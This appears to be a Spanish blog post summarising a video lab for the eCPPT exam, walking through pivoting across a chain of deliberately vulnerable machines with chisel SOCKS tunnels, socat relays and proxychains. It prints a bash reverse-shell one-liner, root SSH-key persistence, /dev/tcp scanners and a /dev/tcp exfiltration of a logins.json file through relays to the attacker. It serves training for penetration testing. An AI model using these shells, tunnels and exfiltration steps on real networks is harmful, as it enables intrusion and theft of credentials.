---
title: Pivoting
author: guiseporaki
date: 2023-09-20
categories: [Linux, Cajón de Arriba]
tags: [Pivoting]
---

Guía-Resumen enfocado a pivoting, sacado del video de s4vitar colgado en youtube llamado "Simulación de examen eCPPTv2", por [aquí](https://www.youtube.com/watch?v=Q7UeWILja-g&t=1501s&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29) lo dejo.

## ¿Qué es el pivoting?

El pivoting también llamado hopping es el proceso de saltar de una máquina a otra máquina. De esta manera logras alcanzar máquinas que no tendrías alcanze desde tu posición inicial o máquina origen.  
Esto se logra a través de tuneles de comunicación desde la máquina comprometida a otras máquinas en la red.

## Explicación laboratorio.

ADJUNTAR IMAGEN AQUI.

La única máquina del laboratorio a la que tendremos contacto es la **Aragog** porque es la única en el mismo segmento que mi host atacante. 

Una vez que consigamos acceso a la máquina Aragog tendremos visibilidad con otra, la **Nagini**, esta máquina Nagini una vez que logremos tener acceso a ella podremos ver otras dos que están en el mismo segmento de red y que podremos ver, que son las máquinas **Fawkes** y **Dumbledore-PC**. 

La Dumbledore-2 es la única de este segmento con una interfaz de red que comunica con otro segmento y podrá ver a la máquina **Matrix 1**. 

Por último Matrix 1 tiene otra interfaz de red que comunica con la máquina **Brainpan**.

Empezamos pwneando máquina Aragog que tiene dos interfaces, y una ip en cada una, la ip 192.168.111.38 y 10.10.0.128.

### Persistencia

Al ser tanta máquina en este laboratorio, y en un exámen para el eCCPT, es recomendable dejar accesos directos a la máquinas pwneadas. En la carpeta /root/.ssh generaremos una clave authorized_keys que será nuestra clave pública para conectarnos -para tener persistencia-:
```sh
ssh-keygen # Desde mi consola atacante
# Nos habrá creado inun id_rsa.pub, nos lo copiamos sin salto de linea del final:
cat /root/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
```
```sh
# Y nos lo copiamos en la máquina víctima en /root/.ssh como authorized_keys
# Ahora nos podremos conectar por ssh como root:
ssh root@IP
```
Podemos usar la misma para el resto de máquinas que pwneamos. Las pasamos al .ssh de root como authorized_keys y listo.

### Descubrimiento de host y puertos:

Desde la máquina **Aragog** en principio podríamos ver la máquina **Nagini**. Vamos a comprobarlo y para ello usaremos el hostDiscovery.sh, se podría hacer de más formas.
```sh
# hostDiscovery.sh

#!/bin/bash

for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVE" &
done; wait
```
Damos permisos de ejecución al script `chmod +x hostDiscovery.sh` y ejecutamos el programa.

Nos descubre otra ip, la **10.10.0.129** que corresponderá a la máquina Nagini.

Para que funcione este método de descubrimiento de IPs mediante trazas icmp la opción tiene que ser aceptada por la máquina objetivo. Si no aceptará esta traza ICMP podríamos hacerlo mediante los puertos:
```sh
#!/bin/bash
# portDiscovery.sh (de los puertos más comunes).
for i in $(seq 1 254); do
    for port in 21 22 80 443 445 8080; do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN" &
    done
done; wait
```
Podemos realizar el esceno a través de un túnel tipo sock con **Chisel**.

### Descargando Chisel

En chisel github de jpillora --> releases --> chisel_1.7.7_linux_amd64.gz o la versión última que sea.
```sh
mkdir chisel # Para ser organizados
# Nos movemos el gunzip a esa carpeta.
gunzip chisel_1.7.7_linux_amd64
mv chisel_1.7.7_linux_amd64 chisel
chmod +x chisel
```

## Primer túnel.

Nuestra máquina atacante actuará como servidor en chisel y las máquinas víctimas serán las clientes. 

Tenemos que pasar el chisel a las víctimas, a esta primera máquina **Aragog** al estar en el mismo segmento lo podemos pasar directamente:
```sh
python3 -m http.server 80 #Desde mi máquina
```
```sh
wget http://MIIP/chisel
# También podrías con curl, o con scp ya que puedes conectarte por ssh con root, desde mi máquina:
scp chisel root@192.168.111.38:/tmp/chisel
```

Desde mi máquina corremos chisel en modo servidor:
```sh
./chisel server --reverse -p 1234
# Nos montamos el servidor por el puerto 1234
```
Si quisiera traerme solo un puerto (que no es el caso):  
Desde Aragog, la primera máquina pwneada, nos corremos el chisel en modo cliente:
```sh
./chisel client 192.168.111.106:1234 R:80:10.10.0.129:80
# Mi ip atacante es 192.168.111.106.
# R de Remote port forwarding.
# La Aragog-10.10.0.128 puede conectar con la Nagini-10.10.0.129 pero yo directamente con la Nagini no.

# R:80:10.10.0.129:80 Quiero traerme el puerto 80 de la 10.10.0.129 para que se convierta en mi puerto 80.
```
Si haces un `lsof -i:80` verás que está ocupado ahora. Mi puerto 80 será el puerto 80 de la Nagini.  
Esto es bueno por saber hacerlo pero vamos a olvidar que lo hicimos para lo que viene.

No quiero traerme solo un puerto..quiero ganar acceso a todas las IPs que haya en ese segmento, a todos los puertos, para ello se usa **socks**:
```sh
# Desde Aragog, la máquina que hace de intermediaria.
./chisel client 192.168.111.106:1234 R:socks
# Como cliente me voy a conectar a la 192.168.11.106 (atacante) por el puerto 1234, y abre una conexión tipo socks, por defecto te abre el 1080.
# Entablamos un túnel tipo socks, por ese puerto 1080 te abre el túnel desde mi compu atacante hasta máquinas visibles por Aragog.
```
Ya desde el puerto 1080, que se abré por defecto, tienes un túnel, una conexión directa hasta la máquina **Nagini** desde mi máquina atacante. Es un shocks5

Abre el /etc/proxychains.conf de mi máquina atacante( de mi compu):
+ Comentamos el dynamic_chain
+ Descomentamos el strict_chain
+ Añadimos al final **socks5 127.0.0.1 1080**

Esto lo hacemos porque jugaremos con la herramienta proxychains que leera ese archivo de configuración y sabrá que tiene que escuchar por el equipo local por el puerto 1080.

### Comprobamos que funciona:
```sh
proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.0.129 2>/dev/null
# Recordarás que antes no teníamos conexión hacía la máquina 10.10.0.29
# Tengo que añadir dos parámetros para que funcione el nmap por el túnel: # -sT de TCP connect Scan, y el -Pn para que no aplique host discovery.
```
¡Y funciona!.


Si quieres analizar todos los puertos y **va algo lento** puedes jugar con **xargs** para paralizar comandos:
```sh
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 10.10.0.129 2>&1 | grep "tcp open"
# Te lanzará 500 tareas en paralelo.
# Convertimos stderr en stout para mostrar los errores y filtrar por ellos.
```
**Con proxychains no se puede usar la opción -sS de nmap**.

Y lo mismo con otras herramientas, solo tienes que poner proxychains delante:
```sh
proxychains whatweb http://10.10.0.129
```

Encontramos los puertos 22 y 80 abiertos. **Para ver la web** -piensa que el port forwarding del puerto 80 no lo hemos hecho- desde foxy proxy del navegador --> add, creamos un nuevo proxy que lo llamaré Nagini, la configuración es; Tipo de proxy: socks5, IP: 127.0.0.1, Port: 1080  
Ya que el proxy lo tengo en el equipo local por el puerto 1080.  
Al pasar por ese proxy ya podrás acceder a la web de la máquina Nagini.

Para fuzzear con **gobuster** con proxy de por medio podemoss hacerlo mismo de poner delante proxychains o mejor porque va más rápido usar el parametro --proxy:
```sh
gobuster dir -u http://10.10.0.129/ -w DICCIONARIO -x txt,php -t 20 --proxy socks5://127.0.0.1:1080
```
Desde la web nos dan una pista de el protocolo http3 que investigando un poco damos que va por el protocolo UDP y el puerto suele ser el 443. El problema es que desde el proxy establecido por el momento el navegador va a intentar conectarse por TCP. De alguna forma hay que decirle que es por UDP, y lo haremoos con un port forwarding:
```sh
./chisel client 192.168.111.106:1234 R:socks R:443:10.10.0.129:443/udp
# Quiero que el puerto 443 de la máquina Nagini sea mi puerto 443 por udp.
```
De esta manera aislado al túnel socks también tenemos ese port forwarding.

En la box Nagini tenemos un SSRF pero que podría ser también RFI, el tema ahora es que aunque tengamos nosotros conectividad con la Nagini gracias al túnel, la Nagini hacía nosotros no la tiene, si quiere descargarse un archivo php por ejemplo de un servidor que creamos en nuestra máquina no podría, para solucionarlo entra la herramienta **socat**.  
**Descargando socat**; socat github --> el de "static-binaries" --> Download --> Movemos a carpeta deseada y le das permisos de ejecución.  
Este socat habrá que moverlo a la máquina Aragog -a la intermediaria- que es donde quiero ejecutarlo, con la ejecución le dirás "todas las peticiones que vengan a mi host -Aragog- por el puerto 80 quiero redirigirlas al puerto 80 de la máquina atacante".

Aprovechando que generamos una clave pública y tenemos acceso por ssh transferimos el archivo con scp:
```sh
scp socat root@192.168.11.38:/tmp/socat

# Y nos montamos un servidor con python, puedes crearte un index.html por comprobar que funciona:
python3 -m http.server 80 
```
Y ahora ya desde la máquina Aragog:
```sh
./socat TCP-LISTEN:4343,fork TCP:192.168.111.106:80
# Quiero que todo lo que llegue a mi máquina (Aragog) por el puerto 4343 se rediriga a mi máquina atacante (192.168.111.106) hacia el puerto 80.
```
Desde la web de Nagini en el cuadro de búsqueda donde tenemos el posible RFI ponemos; http://10.10.0.128:4343. Hay que poner el nodo más cercano, y este nodo que tiene el socat lo redirirá a mi máquina atacante.

> Socat permite controlar el flujo de las comunicaciones, permite que una máquina tercera que en principio no tiene conexión contigo pueda llegar a ti usando una máquina de por medio. Redirigiendo la petición desde el host intermediario hasta mi máquina atacante.

Descartamos este RFI porque no interpretaba php.

Para mandaros una reverse shell el procedimiento es parecido al de antes de querer cargar un recurso de mi máquina. Desde la Nagini sería mandarnos lo típico:  
`bash -c "bash -i >& /dev/tcp/10.10.0.128/1212 0>&1"`. Es decir si manda a la ip más cercana, siempre al nodo más cercano y al puerto que te de la gana. Lo lógico es que el segmento al que te conectes de la Aragog por ssh sea distinto al introducido en la reverse, de ahí que no visualizes directamente la Nagini -solo comentar-.

Desde la Aragog habrá que hacer de nuevo un socat para que la reverse shell llegue hasta mi equipo de atacante.
```sh
./socat TCP-LISTEN:1111,fork TCP:192.168.111.106:443
# Todo lo que llegue al puerto 1111 quiero redirigirlo al puerto 443 de esa IP, la mía atacante.
```
Este proceso se quedará ejecutando, no se podrá cerrar en el fúturo hasta que no tengas acceso de otra manera a la Nagini, como por ejemplo por ssh con proxychain.

Me pongo en escucha desde mi equipo:
```sh
nc -nlvp 443
```
Y ahora ya ejecuaría esa reverse shell - de una manera u otra-  desde la web de la Nagini. La reverse pasaría por la Aragog y luego gracias al socat se rediriría a mi IP por el puerto 443. El tratamiento de la tty es como siempre, que no haya miedo en dejarlo en segundo plano.

Así acabamos este primer túnel. Hemos conseguido acceso a una máquina tercera de la que no teníamos alcanze desde un principio.

## En la Nagini. Hacía el segundo túnel.

Hemos conseguido acceso a la Nagini a través de un túnel pasando por la máquina Aragog.  
Nagini tiene dos interfaces; 10.10.0.129 y 192.168.100.128, la primera es por la que ganamos acceso ya que está en el mismo segmento que la Aragog. Esa segunda interfaz es la que comunicará con otro segmento.

Hay que **rootear** la máquina claro, no se te olvide que el objetivo del hackeo no cambia, es posible que con tanta máquina solo pienses en saltar de una a otra, tienes que rootear los equipos primero, recomendable una vez llegado a root dejar persistencia y luego ya intentar saltar con otro túnel.  
Y siempre que puedas acceder por ssh, te creas una clave pública con el usuario que puedas, cuando llegues a root pues con root, y te conectas:  
```sh
proxychains ssh root@10.10.0.129
```

### Trasnferencia de archivo.

Si quisera pasarme cualquier archivo desde la Nagini a mi equipo recuerda que primero hay que transferirlo al nodo más cercano, es decir, a la Aragog.

Desde la Nagini:
```sh
cat < logins.json > /dev/tcp/10.10.0.128/4646
```
Y desde Aragog:
```sh
socat TCP-LISTEN:4646,fork TCP:192.168.111.106:1214
# Todo lo que me llegue(en Aragog) por el puerto 4646 llevalo hacía mi ip al puerto 1214
```
Desde mi equipo nos pondríamos en escucha:
```sh
nc -nlvp 1214 > logins.json
# No tienes porque poner el mismo nombre, simplemente es el nombre que quieres dar a lo que te llegue.
```
Lanzar los comandos en order inverso, es decir, primero me pongo en escucha y vas subiendo.

### Pocedimiento hackeo resumen.

Lo mismo que cuando llegamos a la Aragog; despúes de llegar a root en la máquina Nagini realizamos un descubrimiento de hosts y puertos, podemos usar las herramientas hostDiscovery.sh y portDiscovery.sh usadas antes. Yo las ejecutaría desde esa misma máquina, más simple.

**Descubriendo más equipos:**

Descubrimos las IPs **192.168.100.130 - Dumbledore-PC** y la **192.168.100.129 - Fawkes**. Solo visibles desde la Nagini.

Vamos primero a por la **Fawks**:

### El segundo túnel.

Al intentar llegar a otro segmento tendremos que crearnos **el segundo túnel**.

Ahora desde la máquina Nagini que es la que conecta con los nuevos segmentos tendremos que correr el chisel en modo cliente, pero tendrás que conectar hacia Aragog, y ya desde Aragog que te rediriga con socat hacia mi máquina atacante. ¡¡¡Vamos a por el segundo túnel!!!:

1. Primeramente hay que transferir el chisel a la máquina Nagini:
```sh
proxychains scp chisel root@10.10.0.129:/tmp/chisel
```
2. Nos conectamos a la Nagini.
```sh
proxychains ssh root@10.10.0.129

chmod +x chisel # damos permiso de ejecución.
```
Tenemos que hacer de la Nagini el cliente para poder conectarse a mi equipo atacante por el puerto 1234 por ejemplo. Imagina que el cliente siempre es el que usas de pivote para saltar a las otros segmentos, es el intermediario a los nuevos equipos que descubras. Antes fue Aragog el cliente para llegar a la Nagini, ahora será la Nagini para llegar a los equipos Dumbledore y Fawks.

3. chisel cliente Nagini y socat en Aragog hacia mi host atacante:  
En Nagini:
```sh
./chisel client 10.10.0.128:2322 R:8888:socks # No lances comando hasta lanzar el socat en Aragog.
```
En Aragog el socat:
```sh
./socat TCP-LISTEN:2322,fork TCP:192.168.111.106:1234
# Con chisel se estan conectando a Aragog por el puerto 2322, quiero redirigirlo hacía mi ordenador atacante por el puerto 1234 porque es ahí donte tengo el túnel creado.
```
¡ Importante entendero esto!, lo llevas al puerto 1234 porque es ahí donde tu tienes el túnel creado. Recuerda este comando del principio `./chisel server --reverse -p 1234`.

Lanzas los comandos y se te habrá llegado una conexión -túnel- por el puerto 8888 a tu máquina atacante.

4. Modificando el /etc/proxychains.conf.

Descomentas el dynamic_chain y comentas el strict_chain.  
Y abajo del archivo donde habías puesto para el primer túnel; socks5 127.0.0.1 1080 Tienes que añadir arriba de esa línea, **porque tienes que poner el último túnel creado en la linea de arriba**, quedaría así:
```
# Parte de abajo del archivo
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```
5. Comprobación. Descubriendo puertos de la máquina Fawks.
```sh
proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 192.168.100.129 2>/dev/null
# Redirige los errores porque con proxychains puede dar problemas.
# Con la opción -sS no te dejará porque solo permite un tipo y ya está el -sT.
```
Y funciona, ueueueue.

**Completado el segundo túnel**. Ahora mismo estamos pasando por dos túneles y conectamos no solo con la Nagini sino también con la Fawks y Dumbledore.

Agilizando con el uso de **xargs** igual que vimos antes al pasar por túneles puede ir lento, y ahora más con un dual-proxy:
```sh
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 10.10.100.129 2>&1 | grep "tcp open"
```

Desde el **navegador** si quiseras ver la web de Fawkes tendrías que añadir un **nuevo proxy**:

Proxy Types: Socks5  
IP: 127.0.0.1  
Port: 8888  
Básicamente donde te abriste el nuevo túnel. Ahora al pasar por este nuevo proxy podrás ver la web de Fawks.

> Si te conectas por ftp por proxy al lanzar comandos dentro puede saltarte el error: Address already in use. Para solucionarlo usa comando **passive**.


## En la Dumbledore rumbo Matrix. Tercer túnel y último.

Una vez rooteada la máquina Dumbledore y dejando persistencia para conectarnos por ssh en el fúturo creamos el tercer túnel para poder llegar a la máquina **Matrix**.

> Si la máquina es un Windows como es el caso de la Dumbledore que será la cliente del chisel, tenemos que hacer el uso del chisel para Windows, también en github.

Para trasnferirlo; con socat y redirigiendo por el 445 abriendo un smb. Se ve en el video [aquí](https://www.youtube.com/watch?v=Q7UeWILja-g&t=1501s&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29), por aquí lo dejo, minuto 4h20min más o menos, lo hacemos para pasarnos nc.exe y lo aprovechamos para el chissel.

Así que desde Dumbledore tenemos la intención de llegar a mi máquina atacante por el puerto que abrimos al crearnos el server con chisel por el puerto 1234. 
La idea es la misma, desde Dumbledor se actuará como cliente, ya que es la máquina intermedia que hará de puente para llegar a los nuevos equipos, ya que solo Dumbledore tiene acceso a ellas.  
No puedo conectarme directamene desde Dumbledora a mi compu, conectariamos el cliente con la Nagini que es el nodo más cercano. Desde Dumbledore ejecutamos el cliente:
```sh
./chisel.exe client 192.168.100.128:6543 R:9999:socks
# 192.168.100.128 Ip de la Nagini. Nos conectaremos a ella por el puerto 6543.
# R:9999:socks Nos abrimos el tercer proxy tipo socks.
```
Antes de ejecutar lo anterior, desde la Nagini:
```sh
./socat TCP-LISTEN:6543,fork TCP:192.168.0.128:6542
# Todo lo que llegue por el puerto 6543, que será la conexión del chisel, lo redirigimos por TCP al nodo más cercano que es la Aragog con ip 192.168.0.128 al puerto 6542
```
Desde Aragog habrá que hacer lo mismo pero ya hacia mi compu:
```sh
./socat TCP-LISTEN:6542,fork TCP:192.168.111.106:1234
# Lo mismo al puerto 1234 que es donde yo tengo abierto el servidor de chisel.
```
Ejecutamos las instrucciones en las tres máquinas de abajo arriba mejor, tiene sentido.  
Recibiremos en nuesta máquina atacante en la terminal del servidor de chisel la conexión-túnel por el puerto 9999 que nos permitirá llegar a los nuevos equipos encontramos solo visibles por la Dumbledore.

Para que funcione recuerda que tienes que editar el proxychains.conf, así que desde tu máquina atacante modificar el **/etc/proxychains.conf**:
```
# Abajo del todo pero encima del segundo túnel añadimos nuevo sock, quedaría así:
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```
Y lo mismo para hackear la siguiene máquina Matrix, ejecutar comandos normalmente pero con el proxychains delante del comando.

### Hasta luego!.

Y esto ha intentado ser un resumen bien detallado del video de s4vitar en youtube (también disponible en su recomendada academia) de "Simulacro para el eCPPT" centrandome en el pivoting. Espero que si alguien lo lee le sirva de algo, ¡pues ala!, besicos.









